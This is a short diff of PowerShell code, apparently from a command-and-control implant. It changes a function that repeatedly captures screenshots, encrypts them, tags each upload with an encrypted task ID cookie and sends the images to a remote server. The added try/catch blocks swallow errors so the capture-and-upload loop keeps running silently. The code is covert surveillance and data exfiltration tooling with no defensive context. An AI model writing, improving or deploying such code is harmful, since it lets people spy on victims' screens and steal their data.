@@ -337,11 +337,14 @@ Function Get-ScreenshotMulti {
 
     if ($Quantity -and $Timedelay) {
         ForEach ($number in 1..[int]$Quantity ) { 
-            $Output = Get-Screenshot         
+            try { $Output = Get-Screenshot } catch { $Output = $null }
+            try {
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
             $eid = Encrypt-String $key $TaskId
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
+                
+            } catch {}      
             Start-Sleep $Timedelay
         }
     }
